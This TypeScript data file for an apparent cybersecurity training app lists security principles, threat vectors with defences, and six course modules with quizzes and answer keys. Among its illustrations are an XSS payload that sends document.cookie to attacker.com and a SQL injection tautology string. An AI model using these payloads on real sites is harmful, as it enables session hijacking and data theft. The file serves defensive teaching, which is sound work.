import { ThreatVector, SecurityModule } from '../types';

export const FOUNDATIONAL_CYBER_PILLARS = [
  {
    code: 'CONFIDENTIALITY',
    title: 'Access Control & Cryptographic Secrecy',
    description:
      'Guaranteeing that sensitive data, credentials, and digital communications are strictly inaccessible to unauthorized entities via robust symmetric/asymmetric encryption (AES-256, RSA-4096, ECC) and Zero-Knowledge proofs.',
    realContext:
      'Whether protecting database credentials, user passwords, or cryptographic private keys, unauthorized disclosure causes catastrophic compromise. Strong encryption ensures stolen raw data remains indecipherable ciphertext.',
    coreMechanism: 'Asymmetric Key Cryptography + End-to-End Encryption + Role-Based Access Control (RBAC)'
  },
  {
    code: 'INTEGRITY',
    title: 'Tamper Detection & Data Authenticity',
    description:
      'Ensuring that information, software code, and transaction histories cannot be altered, forged, or intercepted in transit without immediate mathematical detection.',
    realContext:
      'In web apps and network protocols, cryptographic hashing (SHA-256, HMAC) and digital signatures verify that messages or software updates have not been injected with malicious payloads by a man-in-the-middle.',
    coreMechanism: 'Cryptographic Hashing (SHA-256) + Digital Signatures + Immutable Hash Chains'
  },
  {
    code: 'AVAILABILITY',
    title: 'High Uptime & Fault-Tolerant Infrastructure',
    description:
      'Guaranteeing that critical services, databases, authentication APIs, and networks remain responsive and operational during high traffic, system faults, or Distributed Denial of Service (DDoS) barrages.',
    realContext:
      'A system that cannot be accessed is functionally useless. Availability defends against SYN floods, resource exhaustion attacks, DNS hijacking, and database deadlocks.',
    coreMechanism: 'Anycast DNS + Rate Limiting + Load Balancing + Automated Failover Clustering'
  },
  {
    code: 'ZERO_TRUST',
    title: 'The Modern Defensive Paradigm',
    description:
      'Operating under the immutable rule: "Never trust, always verify." Eliminates implicit trust based on network perimeter, requiring continuous authentication and least-privilege authorization for every request.',
    realContext:
      'Traditional networks assumed that anyone inside the intranet firewall was trustworthy. Zero-Trust verifies identity, device health, and permission token validity on every single microservice call.',
    coreMechanism: 'Micro-Segmentation + Multi-Factor Authentication (MFA) + Mutual TLS (mTLS)'
  }
];

export const THREAT_VECTORS: ThreatVector[] = [
  {
    id: 'sql-injection',
    title: 'SQL Injection (SQLi) & Data Exfiltration',
    category: 'Web Security',
    severity: 'Critical',
    summary:
      'Unsanitized user inputs concatenated directly into dynamic SQL queries allow attackers to bypass authentication, dump entire database contents, and execute arbitrary database commands.',
    attackMechanism:
      'Attacker sends input payload: admin\' OR 1=1; --. The SQL engine interprets the comment and tautology, returning unauthorized administrative sessions without password verification.',
    realWorldImpact: 'Massive enterprise data breaches, identity theft of hundreds of millions of user records, and total database wipeouts.',
    defensiveShield: [
      'Use parameterized queries and Prepared Statements exclusively across all database adapters',
      'Implement strict Object-Relational Mapping (ORM) with schema-level validation',
      'Enforce least-privilege database user permissions (prohibit DROP, ALTER for web app roles)'
    ],
    actionProtocol: 'Never concatenate raw strings into database queries. Always bind parameters via Prepared Statements.'
  },
  {
    id: 'xss-cross-site-scripting',
    title: 'Cross-Site Scripting (Stored & Reflected XSS)',
    category: 'Web Security',
    severity: 'High',
    summary:
      'Malicious JavaScript code injected into trusted web applications executes in victims\' browsers, stealing session cookies, auth tokens, or redirecting to credential harvesters.',
    attackMechanism:
      'An attacker submits a comment containing <script>fetch("https://attacker.com/steal?cookie="+document.cookie)</script>. When another user views the page, the script executes automatically.',
    realWorldImpact: 'Account takeovers, session hijacking, defacement of corporate web portals, and silent banking credential theft.',
    defensiveShield: [
      'Implement context-aware HTML entity encoding on all reflected user inputs',
      'Configure a strict Content Security Policy (CSP) prohibiting inline scripts (script-src \'self\')',
      'Store sensitive session tokens in HttpOnly, Secure, SameSite=Strict cookies'
    ],
    actionProtocol: 'Set HttpOnly flags on all authentication cookies so client-side JavaScript cannot access them.'
  },
  {
    id: 'port-reconnaissance',
    title: 'Reconnaissance, Port Scanning & Service Fingerprinting',
    category: 'Blue Team & Network',
    severity: 'High',
    summary:
      'Adversaries send SYN packets and probe open network ports to identify unpatched services, legacy management consoles (Telnet, RDP), and exploitable service daemon banners.',
    attackMechanism:
      'Automated scanners probe ports 1–65535. Discovering port 23 (Telnet) or unauthenticated Redis on port 6379 reveals an immediate lateral movement vector.',
    realWorldImpact: 'Enables targeted zero-day exploitation of outdated daemons, remote code execution (RCE), and initial network foothold.',
    defensiveShield: [
      'Close all unused ports; bind internal services to 127.0.0.1 rather than 0.0.0.0',
      'Deploy stateful firewalls (iptables, UFW, AWS Security Groups) with default-deny ingress',
      'Implement Port Knocking, IP whitelisting, and VPN/Zero-Trust tunnels for administrative ports'
    ],
    actionProtocol: 'Enforce default-deny firewall policies: drop all incoming traffic except explicitly permitted TLS (443) ports.'
  },
  {
    id: 'osint-credential-stuffing',
    title: 'OSINT Footprint Reconnaissance & Credential Stuffing',
    category: 'Social Eng & OSINT',
    severity: 'Severe',
    summary:
      'Threat actors collect publicly exposed metadata from DNS records, GitHub code leaks, WHOIS registries, and social profiles to construct targeted spear-phishing campaigns or credential stuffing attacks.',
    attackMechanism:
      'Attackers locate exposed employee emails and old breach password dumps, then automate credential testing against corporate single sign-on (SSO) portals.',
    realWorldImpact: 'Corporate domain takeovers, CEO fraud spear-phishing wire transfers, and unauthorized internal repository cloning.',
    defensiveShield: [
      'Perform continuous automated secrets scanning in CI/CD pipelines (TruffleHog, GitGuardian)',
      'Enforce hardware-backed FIDO2 / WebAuthn Multi-Factor Authentication (MFA) across all staff accounts',
      'Strip EXIF metadata from uploaded images and enable WHOIS domain privacy protection'
    ],
    actionProtocol: 'Audit public repository commits and DNS records regularly to remove forgotten subdomains and API keys.'
  },
  {
    id: 'crypto-mitm-tampering',
    title: 'Weak Cryptographic Ciphers & Man-In-The-Middle',
    category: 'Cryptography',
    severity: 'Critical',
    summary:
      'Transmitting data over unencrypted HTTP or utilizing deprecated hashing algorithms (MD5, SHA-1) allows eavesdroppers to inspect credentials and tamper with transmitted packets.',
    attackMechanism:
      'An attacker on a shared network intercepts HTTP traffic via ARP poisoning, steals plaintext authentication headers, and alters downloaded executables in flight.',
    realWorldImpact: 'Mass credential theft on public networks, fraudulent transaction execution, and rogue malware distribution.',
    defensiveShield: [
      'Enforce TLS 1.3 exclusively with HSTS (HTTP Strict Transport Security) enabled',
      'Use slow cryptographic password hashing algorithms with configurable work factors (bcrypt, Argon2id)',
      'Pin TLS public keys for mobile applications communicating with backend services'
    ],
    actionProtocol: 'Never store passwords with MD5 or SHA-256 alone; always utilize Argon2id or bcrypt with high cost factors and unique per-user salts.'
  }
];

export const SECURITY_MODULES: SecurityModule[] = [
  {
    id: 'course-1',
    number: '01',
    title: 'Web Application Security & OWASP Top 10 Defense',
    readTime: '8 min course',
    category: 'Web Security',
    level: 'Foundational',
    summary:
      'Master the essential mechanisms for defending web applications against SQL Injection, Cross-Site Scripting (XSS), and Cross-Site Request Forgery (CSRF).',
    keyConcepts: ['Prepared Statements', 'Content Security Policy (CSP)', 'SameSite Cookies', 'Input Sanitization'],
    stages: [
      {
        stageTitle: 'Understanding Injection Vulnerabilities',
        description:
          'Injection occurs when untrusted user input is sent to an interpreter as part of a command or query. The interpreter is tricked into executing unintended instructions.',
        threatIllustration: 'Input payload: "SELECT * FROM users WHERE email = \'admin\' OR 1=1--\'" returns the entire table without password verification.',
        protectionRule: 'Always separate data from command syntax using Prepared Statements and parameterized queries.'
      },
      {
        stageTitle: 'Cross-Site Scripting (XSS) Mitigation',
        description:
          'XSS allows attackers to execute arbitrary scripts in the victim’s browser, compromising session tokens and impersonating legitimate users.',
        threatIllustration: 'A persistent script stored in a profile bio steals cookies on every page load and sends them to an attacker drop server.',
        protectionRule: 'Enforce context-sensitive output encoding and configure a strict Content-Security-Policy (CSP) header.'
      },
      {
        stageTitle: 'Session Token Hardening & CSRF Protection',
        description:
          'Cross-Site Request Forgery forces an authenticated user to perform state-changing actions. Weak cookie settings allow unauthorized cross-origin requests.',
        threatIllustration: 'Visiting a malicious site sends a hidden POST form to your banking portal using your saved browser session cookie.',
        protectionRule: 'Set SameSite=Lax or Strict on all session cookies and mandate anti-CSRF token verification on all POST/PUT/DELETE requests.'
      }
    ],
    quiz: {
      question: 'Which defense strategy definitively prevents SQL Injection in database-driven web applications?',
      options: [
        'Checking if the input contains uppercase letters',
        'Using Prepared Statements with parameterized queries so data is never parsed as executable code',
        'Encrypting the database disk drive with BitLocker',
        'Running the web application on port 8080 instead of port 80'
      ],
      correctIndex: 1,
      explanation:
        'Prepared statements ensure that the database engine treats user input strictly as data parameters, never as executable SQL instructions, completely neutralizing injection syntax.'
    }
  },
  {
    id: 'course-2',
    number: '02',
    title: 'Blue Team Operations: SIEM & Log Triage Simulation',
    readTime: '10 min course',
    category: 'Blue Team Defense',
    level: 'Intermediate',
    summary:
      'Learn how Security Operations Center (SOC) analysts monitor telemetry, detect anomalies in real-time SIEM log streams, and quarantine compromised endpoints.',
    keyConcepts: ['SIEM Alert Correlation', 'Log Ingestion', 'Incident Response Playbooks', 'Threat Containment'],
    stages: [
      {
        stageTitle: 'The Architecture of Security Information & Event Management (SIEM)',
        description:
          'A SIEM aggregates and correlates syslog, web server, firewall, and endpoint telemetry in real-time to detect suspicious patterns across disparate systems.',
        threatIllustration: 'An attacker attempts 500 failed SSH logins across 5 servers in 60 seconds followed by an immediate successful sudo elevation.',
        protectionRule: 'Write correlation rules that trigger automated alerts whenever threshold login failures are followed by administrative privilege elevation.'
      },
      {
        stageTitle: 'Differentiating False Positives from Active Breaches',
        description:
          'SOC analysts must quickly evaluate log source IPs, timestamps, protocol flags, and reputation intelligence to avoid alert fatigue while catching real intrusions.',
        threatIllustration: 'A developer testing a new API endpoint generates 404 errors, appearing identical to an automated web vulnerability scanner.',
        protectionRule: 'Contextualize telemetry with user asset ownership, change windows, and internal network IP classification.'
      },
      {
        stageTitle: 'Execution of Incident Response Containment',
        description:
          'Once a threat is confirmed, the Blue Team must isolate the infected host, revoke active authentication tokens, and preserve forensic memory dumps.',
        threatIllustration: 'A compromised workstation begins lateral SMB port scans towards core database clusters.',
        protectionRule: 'Isolate the host at the firewall/EDR level immediately to sever command-and-control (C2) communication without powering off memory forensics.'
      }
    ],
    quiz: {
      question: 'What is the primary initial action a SOC analyst should take upon detecting an active compromised workstation?',
      options: [
        'Immediately format the hard drive and reinstall Windows',
        'Isolate the host from the network via EDR/firewall to halt lateral movement while preserving volatile RAM for forensics',
        'Send an angry email to the user asking why they clicked a link',
        'Turn off the power surge protector immediately'
      ],
      correctIndex: 1,
      explanation:
        'Network isolation halts lateral traversal and C2 communication, while keeping the machine running preserves volatile memory (RAM) necessary for root-cause forensic investigation.'
    }
  },
  {
    id: 'course-3',
    number: '03',
    title: 'OSINT: Open Source Intelligence Reconnaissance & Defense',
    readTime: '9 min course',
    category: 'OSINT & Recon',
    level: 'Intermediate',
    summary:
      'Understand how intelligence analysts and ethical hackers collect public intelligence to audit an organization\'s digital attack surface and minimize exposure.',
    keyConcepts: ['Passive DNS Recon', 'EXIF Metadata Analysis', 'GitHub Secret Leaks', 'Footprint Minimization'],
    stages: [
      {
        stageTitle: 'Passive Reconnaissance vs Active Probing',
        description:
          'Passive OSINT gathers public data without directly sending packets to the target’s infrastructure, utilizing DNS records, certificate transparency logs, and search engine dorks.',
        threatIllustration: 'Certificate Transparency logs reveal internal staging subdomains like "staging-auth.corp.com" containing unauthenticated debug tools.',
        protectionRule: 'Do not rely on obscurity. Protect staging environments with mandatory authentication and private VPN access.'
      },
      {
        stageTitle: 'Hidden Metadata & File Forensics',
        description:
          'Publicly uploaded PDFs, documents, and images often contain embedded creator usernames, internal file paths, software versions, and GPS coordinates in EXIF tags.',
        threatIllustration: 'A corporate PDF whitepaper reveals the author’s Windows username and internal network share directory path.',
        protectionRule: 'Implement automated CI/CD sanitization pipelines to strip all EXIF metadata and author tags before publishing documents.'
      },
      {
        stageTitle: 'Code Repository & Credential Leak Defense',
        description:
          'Developers frequently push private API keys, database credentials, or private keys to public GitHub repositories by accident in git commits.',
        threatIllustration: 'A commit containing AWS_SECRET_ACCESS_KEY is pushed to a public repo; automated bot scrapers drain resources within 90 seconds.',
        protectionRule: 'Install pre-commit hooks (git-secrets, TruffleHog) that scan for high-entropy secrets and block commits containing credentials.'
      }
    ],
    quiz: {
      question: 'Why are Certificate Transparency (CT) logs a goldmine for passive OSINT reconnaissance?',
      options: [
        'They give hackers the root private keys of all websites automatically',
        'They are public append-only cryptographic ledgers of all SSL/TLS certificates issued, exposing hidden company subdomains',
        'They allow anyone to modify the victim’s DNS records',
        'They disable HTTPS encryption on the target web server'
      ],
      correctIndex: 1,
      explanation:
        'Certificate Transparency logs are public records of every SSL certificate issued by Certificate Authorities, allowing researchers and attackers to discover subdomains without touching the victim\'s network.'
    }
  },
  {
    id: 'course-4',
    number: '04',
    title: 'Applied Cryptography, Hash Avalanche & Salted Storage',
    readTime: '8 min course',
    category: 'Cryptography',
    level: 'Advanced',
    summary:
      'Delve into mathematical cryptography: the SHA-256 avalanche effect, asymmetric public/private key pairs, and modern slow password hashing algorithms.',
    keyConcepts: ['SHA-256 Avalanche Property', 'PBKDF2 / Argon2id', 'Salt & Pepper Storage', 'Asymmetric Key Exchange'],
    stages: [
      {
        stageTitle: 'The One-Way Mathematical Trapdoor of Hashing',
        description:
          'Cryptographic hash functions produce a fixed-length digest from arbitrary inputs. They are computationally infeasible to reverse (preimage resistance).',
        threatIllustration: 'Using fast cryptographic hashes like MD5 or SHA-1 for passwords allows precomputed rainbow tables to crack millions of hashes per second.',
        protectionRule: 'Never use general-purpose fast cryptographic hashes (SHA-256, MD5) for passwords. Use memory-hard key derivation functions like Argon2id or bcrypt.'
      },
      {
        stageTitle: 'Salted Hashes & Rainbow Table Immunity',
        description:
          'A cryptographic salt is a unique, cryptographically random string generated per user and concatenated with the password before hashing.',
        threatIllustration: 'Two users with the password "Password123" produce identical hash outputs in the database, allowing batch cracking.',
        protectionRule: 'Always generate a unique cryptographically random salt (minimum 16 bytes) for every single password to defeat rainbow table attacks.'
      },
      {
        stageTitle: 'Asymmetric Keypairs: Public Encryption & Private Signing',
        description:
          'Asymmetric cryptography uses mathematically linked keypairs. Data encrypted with the public key can only be decrypted by the matching private key.',
        threatIllustration: 'Transmitting confidential API communications over symmetric keys without secure key exchange leads to master key leakage.',
        protectionRule: 'Use Diffie-Hellman or Elliptic Curve Key Exchange (ECDHE) with forward secrecy so past sessions cannot be decrypted if keys leak.'
      }
    ],
    quiz: {
      question: 'Why is standard SHA-256 considered inappropriate for storing user passwords in modern web applications?',
      options: [
        'SHA-256 has been mathematically broken and hashes can be reversed in 2 seconds',
        'SHA-256 is designed to be extremely fast; modern GPUs can compute over 10 billion SHA-256 hashes per second, making brute-force cracking trivial',
        'SHA-256 only works on numbers, not on alphabetical password characters',
        'SHA-256 requires internet access to verify hashes'
      ],
      correctIndex: 1,
      explanation:
        'Fast hashing functions enable offline GPU clusters to test billions of guesses per second. Password storage requires slow, memory-intensive algorithms like Argon2id or bcrypt.'
    }
  },
  {
    id: 'course-5',
    number: '05',
    title: 'Network Defense, Port Hardening & Firewall Rulesets',
    readTime: '10 min course',
    category: 'Network Security',
    level: 'Foundational',
    summary:
      'Configure enterprise firewall policies, implement egress filtering, inspect network packets, and defend servers from port scanning probes.',
    keyConcepts: ['Stateful Packet Inspection', 'Default-Deny Ingress', 'Egress Filtering', 'Port Scanning Defense'],
    stages: [
      {
        stageTitle: 'Stateful vs Stateless Packet Filtering',
        description:
          'Stateful firewalls track the connection state of TCP and UDP streams (NEW, ESTABLISHED, RELATED), blocking unsolicited inbound packets while permitting response traffic.',
        threatIllustration: 'An attacker attempts to send unsolicited SYN packets to arbitrary internal high ports on server endpoints.',
        protectionRule: 'Configure firewall rules that only accept inbound packets matching ESTABLISHED connection states unless explicitly permitted.'
      },
      {
        stageTitle: 'The Critical Importance of Egress Filtering',
        description:
          'Most security teams focus exclusively on inbound traffic, ignoring outbound connections. Egress filtering blocks malware from dialing out to command-and-control (C2) servers.',
        threatIllustration: 'Malware drops on a web server and connects outbound on port 4444 to an attacker IP to establish a reverse shell.',
        protectionRule: 'Block all outbound server connections by default, explicitly whitelisting only necessary update mirrors and API gateways.'
      },
      {
        stageTitle: 'Network Segmentation & DMZ Design',
        description:
          'Isolating public-facing web servers from internal database repositories prevents an initial web breach from easily pivoting into core data assets.',
        threatIllustration: 'Attacker compromises an unpatched public web server and easily traverses directly into the unsegmented patient records database.',
        protectionRule: 'Place public web servers in a Demilitarized Zone (DMZ) with strict firewall rules preventing direct database traversal.'
      }
    ],
    quiz: {
      question: 'What is the primary defensive benefit of implementing strict Egress Filtering on your servers?',
      options: [
        'It speeds up the server’s internet download speed by 50%',
        'It prevents compromised servers from communicating outbound to attacker command-and-control (C2) servers or exfiltrating data',
        'It encrypts all internal hard drives automatically',
        'It makes the server invisible to Google search bots'
      ],
      correctIndex: 1,
      explanation:
        'Egress filtering restricts outbound traffic. If an attacker gains an initial foothold, egress blocks prevent reverse shells and thwart stolen data exfiltration.'
    }
  },
  {
    id: 'course-6',
    number: '06',
    title: 'Ethical Hacking Methodology & Responsible Disclosure',
    readTime: '11 min course',
    category: 'Ethical Hacking',
    level: 'Intermediate',
    summary:
      'Understand the authorized penetration testing lifecycle: scoping, reconnaissance, scanning, vulnerability verification, and professional remediation reporting.',
    keyConcepts: ['Rules of Engagement', 'Vulnerability Assessment vs Pentesting', 'CVSS Scoring', 'Responsible Disclosure'],
    stages: [
      {
        stageTitle: 'The Five Phases of Ethical Penetration Testing',
        description:
          'Authorized security testing follows a rigorous lifecycle: 1. Reconnaissance, 2. Scanning & Enumeration, 3. Vulnerability Analysis, 4. Exploitation Verification, 5. Reporting & Remediation.',
        threatIllustration: 'Performing testing without written authorization (Rules of Engagement) violates computer fraud laws regardless of benevolent intent.',
        protectionRule: 'Always establish clear Rules of Engagement, explicit IP scopes, and non-destructive testing boundaries before testing.'
      },
      {
        stageTitle: 'Quantifying Risk with CVSS Scoring',
        description:
          'The Common Vulnerability Scoring System (CVSS) provides an open framework for standardizing the severity and impact of software vulnerabilities from 0.0 to 10.0.',
        threatIllustration: 'Teams wasting critical engineering hours patching low-severity information disclosure while ignoring critical remote code execution flaws.',
        protectionRule: 'Prioritize patching based on CVSS base score combined with real-world threat intelligence and exploit availability.'
      },
      {
        stageTitle: 'Responsible Vulnerability Disclosure',
        description:
          'Ethical researchers coordinate with vendor security teams, providing a minimum 90-day grace period for patches before public coordinated disclosure.',
        threatIllustration: 'Releasing zero-day vulnerability details publicly before a vendor patch exists exposes millions of innocent users to immediate attacks.',
        protectionRule: 'Submit technical findings via security.txt or bug bounty platforms (HackerOne, Bugcrowd) with reproduction steps.'
      }
    ],
    quiz: {
      question: 'What fundamentally distinguishes ethical white-hat hacking from malicious black-hat cyber attacks?',
      options: [
        'White-hat hackers only use Apple MacBooks while black-hat hackers use Linux',
        'Explicit legal authorization, predefined scope, and non-destructive remediation objectives to protect systems and users',
        'White-hat hackers do not look at code',
        'White-hat testing can only be conducted during weekend maintenance hours'
      ],
      correctIndex: 1,
      explanation:
        'Ethical hacking requires explicit written authorization, strict adherence to agreed scope boundaries, and the goal of reporting vulnerabilities for remediation.'
    }
  }
];
